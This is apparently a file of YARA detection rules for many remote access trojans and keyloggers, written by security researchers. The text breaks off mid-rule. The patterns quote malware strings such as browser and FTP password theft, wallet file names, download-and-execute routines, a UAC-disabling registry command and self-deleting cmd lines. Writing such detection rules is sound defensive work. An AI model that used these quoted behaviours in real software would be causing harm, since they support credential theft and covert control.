  "PoisonIvy_Generic_3": "rule PoisonIvy_Generic_3 {\n\tmeta:\n\t\tdescription = \"PoisonIvy RAT Generic Rule\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015-05-14\"\n\t\thash = \"e1cbdf740785f97c93a0a7a01ef2614be792afcd\"\n\tstrings:\n\t\t$k1 = \"Tiger324{\" fullword ascii\n\t\t\n\t\t$s2 = \"WININET.dll\" fullword ascii\n\t\t$s3 = \"mscoree.dll\" fullword wide\n\t\t$s4 = \"WS2_32.dll\" fullword\n\t\t$s5 = \"Explorer.exe\" fullword wide\n\t\t$s6 = \"USER32.DLL\"\n\t\t$s7 = \"CONOUT$\"\n\t\t$s8 = \"login.asp\"\n\t\t\n\t\t$h1 = \"HTTP/1.0\"\n\t\t$h2 = \"POST\"\n\t\t$h3 = \"login.asp\"\n\t\t$h4 = \"check.asp\"\n\t\t$h5 = \"result.asp\"\n\t\t$h6 = \"upload.asp\"\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and\n\t\t\t( \n\t\t\t\t$k1 or all of ($s*) or all of ($h*)\n\t\t\t)\n}\nrule PoisonIvy_2\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/PoisonIvy\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n    strings:\n    \t$stub = {04 08 00 53 74 75 62 50 61 74 68 18 04}\n        $string1 = \"CONNECT %s:%i HTTP/1.0\"\n        $string2 = \"ws2_32\"\n        $string3 = \"cks=u\"\n        $string4 = \"thj@h\"\n        $string5 = \"advpack\"\n    condition:\n\t\t$stub at 0x1620 and all of ($string*) or (all of them)\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.\n*/\n\nrule AAR : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/AAR\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"Hashtable\"\n\t\t$b = \"get_IsDisposed\"\n\t\t$c = \"TripleDES\"\n\t\t$d = \"testmemory.FRMMain.resources\"\n\t\t$e = \"$this.Icon\" wide\n\t\t$f = \"{11111-22222-20001-00001}\" wide\n\t\t$g = \"@@@@@\"\n\n\tcondition:\n\t\tall of them\n}\n\nrule Ap0calypse: RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Ap0calypse\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"Ap0calypse\"\n\t\t$b = \"Sifre\"\n\t\t$c = \"MsgGoster\"\n\t\t$d = \"Baslik\"\n\t\t$e = \"Dosyalars\"\n\t\t$f = \"Injecsiyon\"\n\n\tcondition:\n\t\tall of them\n}\n\nrule Arcom : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Arcom\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n        \n    strings:\n        $a1 = \"CVu3388fnek3W(3ij3fkp0930di\"\n        $a2 = \"ZINGAWI2\"\n        $a3 = \"clWebLightGoldenrodYellow\"\n        $a4 = \"Ancestor for '%s' not found\" wide\n        $a5 = \"Control-C hit\" wide\n        $a6 = {A3 24 25 21}\n        \n    condition:\n        all of them\n}\n\nrule Bandook : RAT\n{\n\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/bandook\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n        \n    strings:\n    \t\t$a = \"aaaaaa1|\"\n            $b = \"aaaaaa2|\"\n            $c = \"aaaaaa3|\"\n            $d = \"aaaaaa4|\"\n\t\t\t$e = \"aaaaaa5|\"\n\t\t\t$f = \"%s%d.exe\"\n\t\t\t$g = \"astalavista\"\n\t\t\t$h = \"givemecache\"\n\t\t\t$i = \"%s\\\\system32\\\\drivers\\\\blogs\\\\*\"\n\t\t\t$j = \"bndk13me\"\n\t\t\t\n\n        \n    condition:\n    \t\tall of them\n}\n\nrule BlackNix : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/BlackNix\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n        \n    strings:\n\t\t$a1 = \"SETTINGS\" wide\n\t\t$a2 = \"Mark Adler\"\n\t\t$a3 = \"Random-Number-Here\"\n\t\t$a4 = \"RemoteShell\"\n\t\t$a5 = \"SystemInfo\"\n\n\t\n\tcondition:\n\t\tall of them\n}\nrule BlueBanana : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/BlueBanana\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"Java\"\n\n\tstrings:\n\t\t$meta = \"META-INF\"\n\t\t$conf = \"config.txt\"\n\t\t$a = \"a/a/a/a/f.class\"\n\t\t$b = \"a/a/a/a/l.class\"\n\t\t$c = \"a/a/a/b/q.class\"\n\t\t$d = \"a/a/a/b/v.class\"\n\n\t\t\n\tcondition:\n\t\tall of them\n}\nrule ClientMesh : RAT\n{\n    meta:\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/06\"\n        ref = \"http://malwareconfig.com/stats/ClientMesh\"\n        family = \"torct\"\n\n    strings:\n        $string1 = \"machinedetails\"\n        $string2 = \"MySettings\"\n        $string3 = \"sendftppasswords\"\n        $string4 = \"sendbrowserpasswords\"\n        $string5 = \"arma2keyMass\"\n        $string6 = \"keylogger\"\n        $conf = {00 00 00 00 00 00 00 00 00 7E}\n\n    condition:\n        all of them\n}\nrule DarkRAT : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/DarkRAT\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"@1906dark1996coder@\"\n\t\t$b = \"SHEmptyRecycleBinA\"\n\t\t$c = \"mciSendStringA\"\n\t\t$d = \"add_Shutdown\"\n\t\t$e = \"get_SaveMySettingsOnExit\"\n\t\t$f = \"get_SpecialDirectories\"\n\t\t$g = \"Client.My\"\n\n\tcondition:\n\t\tall of them\n}\nrule Greame : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Greame\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\t\t\n\tstrings:\n    \t\t$a = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}\n            $b = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}\n            $c = \"EditSvr\"\n            $d = \"TLoader\"\n\t\t\t$e = \"Stroks\"\n            $f = \"Avenger by NhT\"\n\t\t\t$g = \"####@####\"\n\t\t\t$h = \"GREAME\"\n\t\t\t\n    condition:\n    \t\tall of them\n}\nrule HawkEye : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2015/06\"\n\t\tref = \"http://malwareconfig.com/stats/HawkEye\"\n\t\tmaltype = \"KeyLogger\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$key = \"HawkEyeKeylogger\" wide\n\t\t$salt = \"099u787978786\" wide\n\t\t$string1 = \"HawkEye_Keylogger\" wide\n\t\t$string2 = \"holdermail.txt\" wide\n\t\t$string3 = \"wallet.dat\" wide\n\t\t$string4 = \"Keylog Records\" wide\n        $string5 = \"<!-- do not script -->\" wide\n        $string6 = \"\\\\pidloc.txt\" wide\n        $string7 = \"BSPLIT\" wide\n        \n\n\tcondition:\n\t\t$key and $salt and all of ($string*)\n}\nrule Imminent : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/Imminent\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $v1a = \"DecodeProductKey\"\n        $v1b = \"StartHTTPFlood\"\n        $v1c = \"CodeKey\"\n        $v1d = \"MESSAGEBOX\"\n        $v1e = \"GetFilezillaPasswords\"\n        $v1f = \"DataIn\"\n        $v1g = \"UDPzSockets\"\n        $v1h = {52 00 54 00 5F 00 52 00 43 00 44 00 41 00 54 00 41}\n\n        $v2a = \"<URL>k__BackingField\"\n        $v2b = \"<RunHidden>k__BackingField\"\n        $v2c = \"DownloadAndExecute\"\n        $v2d = \"-CHECK & PING -n 2 127.0.0.1 & EXIT\" wide\n        $v2e = \"england.png\" wide\n        $v2f = \"Showed Messagebox\" wide\n    condition:\n        all of ($v1*) or all of ($v2*)\n}\nrule Infinity : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Infinity\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"CRYPTPROTECT_PROMPTSTRUCT\"\n\t\t$b = \"discomouse\"\n\t\t$c = \"GetDeepInfo\"\n\t\t$d = \"AES_Encrypt\"\n\t\t$e = \"StartUDPFlood\"\n\t\t$f = \"BATScripting\" wide\n\t\t$g = \"FBqINhRdpgnqATxJ.html\" wide\n\t\t$i = \"magic_key\" wide\n\n\tcondition:\n\t\tall of them\n}\nrule JavaDropper : RAT\n{\n    meta:\n\t    author = \" Kevin Breen <kevin@techanarchy.net>\"\n\t    date = \"2015/10\"\n\t    ref = \"http://malwareconfig.com/stats/AlienSpy\"\n\t    maltype = \"Remote Access Trojan\"\n\t    filetype = \"jar\"\n\n    strings:\n\t    $jar = \"META-INF/MANIFEST.MF\"\n\n\t    $a1 = \"ePK\"\n\t    $a2 = \"kPK\"\n\n        $b1 = \"config.ini\"\n        $b2 = \"password.ini\"\n\n        $c1 = \"stub/stub.dll\"\n\n        $d1 = \"c.dat\"\n\n    condition:\n        $jar and (all of ($a*) or all of ($b*) or all of ($c*) or all of ($d*))\n}\nrule LostDoor : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/LostDoor\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n        \n    strings:\n    \t$a0 = {0D 0A 2A 45 44 49 54 5F 53 45 52 56 45 52 2A 0D 0A}\n        $a1 = \"*mlt* = %\"\n        $a2 = \"*ip* = %\"\n        $a3 = \"*victimo* = %\"\n        $a4 = \"*name* = %\"\n        $b5 = \"[START]\"\n        $b6 = \"[DATA]\"\n        $b7 = \"We Control Your Digital World\" wide ascii\n        $b8 = \"RC4Initialize\" wide ascii\n        $b9 = \"RC4Decrypt\" wide ascii\n        \n    condition:\n    \tall of ($a*) or all of ($b*)\n}\nrule LuminosityLink : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/LuminosityLink\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $a = \"SMARTLOGS\" wide\n        $b = \"RUNPE\" wide\n        $c = \"b.Resources\" wide\n        $d = \"CLIENTINFO*\" wide\n        $e = \"Invalid Webcam Driver Download URL, or Failed to Download File!\" wide\n        $f = \"Proactive Anti-Malware has been manually activated!\" wide\n        $g = \"REMOVEGUARD\" wide\n        $h = \"C0n1f8\" wide\n        $i = \"Luminosity\" wide\n        $j = \"LuminosityCryptoMiner\" wide\n        $k = \"MANAGER*CLIENTDETAILS*\" wide\n\n    condition:\n        all of them\n}\nrule LuxNet : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/LuxNet\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"GetHashCode\"\n\t\t$b = \"Activator\"\n\t\t$c = \"WebClient\"\n\t\t$d = \"op_Equality\"\n\t\t$e = \"dickcursor.cur\" wide\n\t\t$f = \"{0}|{1}|{2}\" wide\n\n\tcondition:\n\t\tall of them\n}\nrule NanoCore : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/NanoCore\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $a = \"NanoCore\"\n        $b = \"ClientPlugin\"\n        $c = \"ProjectData\"\n        $d = \"DESCrypto\"\n        $e = \"KeepAlive\"\n        $f = \"IPNETROW\"\n        $g = \"LogClientMessage\"\n\t\t$h = \"|ClientHost\"\n\t\t$i = \"get_Connected\"\n\t\t$j = \"#=q\"\n        $key = {43 6f 24 cb 95 30 38 39}\n\n\n    condition:\n        6 of them\n}\n\t\nrule Paradox : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Paradox\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"ParadoxRAT\"\n\t\t$b = \"Form1\"\n\t\t$c = \"StartRMCam\"\n\t\t$d = \"Flooders\"\n\t\t$e = \"SlowLaris\"\n\t\t$f = \"SHITEMID\"\n\t\t$g = \"set_Remote_Chat\"\n\n\tcondition:\n\t\tall of them\n}\nrule Plasma : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/Plasma\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $a = \"Miner: Failed to Inject.\" wide\n        $b = \"Started GPU Mining on:\" wide\n        $c = \"BK: Hard Bot Killer Ran Successfully!\" wide\n        $d = \"Uploaded Keylogs Successfully!\" wide\n        $e = \"No Slowloris Attack is Running!\" wide\n        $f = \"An ARME Attack is Already Running on\" wide\n        $g = \"Proactive Bot Killer Enabled!\" wide\n        $h = \"PlasmaRAT\" wide ascii\n        $i = \"AntiEverything\" wide ascii\n\n    condition:\n        all of them\n}\nrule PredatorPain : RAT\n{\n\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/PredatorPain\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$string1 = \"holderwb.txt\" wide\n\t\t$string3 = \"There is a file attached to this email\" wide\n\t\t$string4 = \"screens\\\\screenshot\" wide\n\t\t$string5 = \"Disablelogger\" wide\n\t\t$string6 = \"\\\\pidloc.txt\" wide\n        $string7 = \"clearie\" wide\n        $string8 = \"clearff\" wide\n        $string9 = \"emails should be sent to you shortly\" wide\n        $string10 = \"jagex_cache\\\\regPin\" wide\n        $string11 = \"open=Sys.exe\" wide\n\t\t$ver1 = \"PredatorLogger\" wide\n\t\t$ver2 = \"EncryptedCredentials\" wide\n        $ver3 = \"Predator Pain\" wide\n\n\tcondition:\n\t\t7 of ($string*) and any of ($ver*)\n}\nrule Punisher : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Punisher\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"abccba\"\n\t\t$b = {5C 00 68 00 66 00 68 00 2E 00 76 00 62 00 73}\n\t\t$c = {5C 00 73 00 63 00 2E 00 76 00 62 00 73}\n\t\t$d = \"SpyTheSpy\" wide ascii\n\t\t$e = \"wireshark\" wide\n\t\t$f = \"apateDNS\" wide\n\t\t$g = \"abccbaDanabccb\"\n\n\tcondition:\n\t\tall of them\n}\nrule PythoRAT : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/PythoRAT\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"TKeylogger\"\n\t\t$b = \"uFileTransfer\"\n\t\t$c = \"TTDownload\"\n\t\t$d = \"SETTINGS\"\n\t\t$e = \"Unknown\" wide\n\t\t$f = \"#@#@#\"\n\t\t$g = \"PluginData\"\n\t\t$i = \"OnPluginMessage\"\n\n\tcondition:\n\t\tall of them\n}\nrule QRat : RAT\n{\n    meta:\n        author = \"Kevin Breen @KevTheHermit\"\n        date = \"2015/08\"\n        ref = \"http://malwareconfig.com\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"jar\"\n        \n    strings:\n        $a0 = \"e-data\"\n        $a1 = \"quaverse/crypter\"\n        $a2 = \"Qrypt.class\"\n        $a3 = \"Jarizer.class\"\n        $a4 = \"URLConnection.class\"\n        \n        \n    condition:\n        4 of them\n\n\n}\nrule SmallNet : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/SmallNet\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\t\t\n\tstrings:\n\t\t$split1 = \"!!<3SAFIA<3!!\"\n\t\t$split2 = \"!!ElMattadorDz!!\"\n\t\t$a1 = \"stub_2.Properties\"\n\t\t$a2 = \"stub.exe\" wide\n\t\t$a3 = \"get_CurrentDomain\"\n\n\tcondition:\n\t\t($split1 or $split2) and (all of ($a*))\n}\nrule SpyGate : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/SpyGate\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$split = \"abccba\"\n\t\t$a1 = \"abccbaSpyGateRATabccba\" //$a = Version 0.2.6\n\t\t$a2 = \"StubX.pdb\" \n\t\t$a3 = \"abccbaDanabccb\"\n\t\t$b1 = \"monikerString\" nocase //$b = Version 2.0\n\t\t$b2 = \"virustotal1\"\n\t\t$b3 = \"get_CurrentDomain\"\n\t\t$c1 = \"shutdowncomputer\" wide //$c = Version 2.9\n\t\t$c2 = \"shutdown -r -t 00\" wide\n\t\t$c3 = \"set cdaudio door closed\" wide\n\t\t$c4 = \"FileManagerSplit\" wide\n\t\t$c5 = \"Chating With >> [~Hacker~]\" wide\n\n\tcondition:\n\t\t(all of ($a*) and #split > 40) or (all of ($b*) and #split > 10) or (all of ($c*))\n}\nrule Sub7Nation : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Sub7Nation\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"EnableLUA /t REG_DWORD /d 0 /f\"\n\t\t$b = \"*A01*\"\n\t\t$c = \"*A02*\"\n\t\t$d = \"*A03*\"\n\t\t$e = \"*A04*\"\t\n\t\t$f = \"*A05*\"\n\t\t$g = \"*A06*\"\n\t\t$h = \"#@#@#\"\n\t\t$i = \"HostSettings\"\n\t\t$verSpecific1 = \"sevane.tmp\"\n\t\t$verSpecific2 = \"cmd_.bat\"\n\t\t$verSpecific3 = \"a2b7c3d7e4\"\n\t\t$verSpecific4 = \"cmd.dll\"\n\n\t\t\n\tcondition:\n\t\tall of them\n}\nrule UPX : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\n\tstrings:\n\t\t$a = \"UPX0\"\n\t\t$b = \"UPX1\"\n\t\t$c = \"UPX!\"\n\n\tcondition:\n\t\tall of them\n}\nrule Vertex : RAT\n{\n\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Vertex\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$string1 = \"DEFPATH\"\n\t\t$string2 = \"HKNAME\"\n\t\t$string3 = \"HPORT\"\n\t\t$string4 = \"INSTALL\"\n\t\t$string5 = \"IPATH\"\n\t\t$string6 = \"MUTEX\"\n\t\t$res1 = \"PANELPATH\"\n\t\t$res2 = \"ROOTURL\"\n\n\tcondition:\n\t\tall of them\n}\nrule VirusRat : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/VirusRat\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$string0 = \"virustotal\"\n\t\t$string1 = \"virusscan\"\n\t\t$string2 = \"abccba\"\n\t\t$string3 = \"pronoip\"\n\t\t$string4 = \"streamWebcam\"\n\t\t$string5 = \"DOMAIN_PASSWORD\"\n\t\t$string6 = \"Stub.Form1.resources\"\n\t\t$string7 = \"ftp://{0}@{1}\" wide\n\t\t$string8 = \"SELECT * FROM moz_logins\" wide\n\t\t$string9 = \"SELECT * FROM moz_disabledHosts\" wide\n\t\t$string10 = \"DynDNS\\\\Updater\\\\config.dyndns\" wide\n\t\t$string11 = \"|BawaneH|\" wide\n\n\tcondition:\n\t\tall of them\n}\nrule unrecom : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/AAR\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$meta = \"META-INF\"\n\t\t$conf = \"load/ID\"\n\t\t$a = \"load/JarMain.class\"\n\t\t$b = \"load/MANIFEST.MF\"\n        $c = \"plugins/UnrecomServer.class\"\n\n\tcondition:\n\t\tall of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule sakula_v1_0: RAT\n{\n    meta:\n        description = \"Sakula v1.0\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"=%s&type=%d\"\n        $m4 = \"?photoid=\"\n        $m5 = \"iexplorer\"\n                $m6 = \"net start \\\"%s\\\"\"\n        $v1_1 = \"MicroPlayerUpdate.exe\"\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and all of ($m*) and not $v1_1\n}\n\nrule sakula_v1_1: RAT\n{\n    meta:\n        description = \"Sakula v1.1\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"=%s&type=%d\"\n        $m4 = \"?photoid=\"\n        $m5 = \"iexplorer\"\n                $m6 = \"net start \\\"%s\\\"\"\n        $v1_1 = \"MicroPlayerUpdate.exe\"\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and all of them\n}\n\nrule sakula_v1_2: RAT\n{\n    meta:\n        description = \"Sakula v1.2\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"cmd.exe /c rundll32 \\\"%s\\\"\"\n        $v1_1 = \"MicroPlayerUpdate.exe\"\n        $v1_2 = \"CCPUpdate\"\n\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and $m1 and $m2 and $m3 and $v1_2 and not $v1_1\n}\n\nrule sakula_v1_3: RAT\n{\n    meta:\n        description = \"Sakula v1.3\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"cmd.exe /c rundll32 \\\"%s\\\"\"\n\n        $v1_3 = { 81 3E 78 03 00 00 75 57  8D 54 24 14 52 68 0C 05 41 00 68 01 00 00 80 FF  15 00 F0 40 00 85 C0 74 10 8B 44 24 14 68 2C 31  41 00 50 FF 15 10 F0 40 00 8B 4C 24 14 51 FF 15  24 F0 40 00 E8 0F 09 00 }\n\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and all of them\n}\n\nrule sakula_v1_4: RAT\n{\n    meta:\n        description = \"Sakula v1.4\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"cmd.exe /c rundll32 \\\"%s\\\"\"\n\n        $v1_4 = { 50 E8 CD FC FF FF 83 C4  04 68 E8 03 00 00 FF D7 56 E8 54 12 00 00 E9 AE  FE FF FF E8 13 F5 FF FF }\n\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and all of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule ShadowTech_2\n{\n    meta:\n        description = \"ShadowTech RAT\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $string1 = /\\#(S)trings/\n        $string2 = /\\#(G)UID/\n        $string3 = /\\#(B)lob/\n        $string4 = /(S)hadowTech Rat\\.exe/\n        $string5 = /(S)hadowTech_Rat/\n\n    condition:\n        all of them\n}\nrule ShadowTech\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/ShadowTech\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"ShadowTech\" nocase\n\t\t$b = \"DownloadContainer\"\n\t\t$c = \"MySettings\"\n\t\t$d = \"System.Configuration\"\n\t\t$newline = \"#-@NewLine@-#\" wide\n\t\t$split = \"pSIL\" wide\n\t\t$key = \"ESIL\" wide\n\n\tcondition:\n\t\t4 of them\n}\n\nrule shimrat: RAT\n{\n meta:\n  description = \"Detects ShimRat and the ShimRat loader\"\n  author = \"Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)\"\n  date = \"20/11/2015\"\n  ref = \"https://blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing-adversary/\"\n  \n strings:\n  $dll = \".dll\"\n  $dat = \".dat\"\n  $headersig = \"QWERTYUIOPLKJHG\"\n  $datasig = \"MNBVCXZLKJHGFDS\"\n  $datamarker1 = \"Data$$00\"\n  $datamarker2 = \"Data$$01%c%sData\"\n  $cmdlineformat = \"ping localhost -n 9 /c %s > nul\"\n  $demoproject_keyword1 = \"Demo\"\n  $demoproject_keyword2 = \"Win32App\"\n  $comspec = \"COMSPEC\"\n  $shim_func1 = \"ShimMain\"\n  $shim_func2 = \"NotifyShims\"\n  $shim_func3 = \"GetHookAPIs\"\n\n\n condition:\n  ($dll and $dat and $headersig and $datasig) or ($datamarker1 and $datamarker2) or ($cmdlineformat and $demoproject_keyword1 and $demoproject_keyword2 and $comspec) or ($dll and $dat and $shim_func1 and $shim_func2 and $shim_func3)\n}\n\nrule shimratreporter: RAT\n{\n meta:\n  description = \"Detects ShimRatReporter\"\n  author = \"Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)\"\n  date = \"20/11/2015\"\n  ref = \"https://blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing-adversary/\"\n\n\n strings:\n  $IpInfo = \"IP-INFO\"\n  $NetworkInfo = \"Network-INFO\"\n  $OsInfo = \"OS-INFO\"\n  $ProcessInfo = \"Process-INFO\"\n  $BrowserInfo = \"Browser-INFO\"\n  $QueryUserInfo = \"QueryUser-INFO\"\n  $UsersInfo = 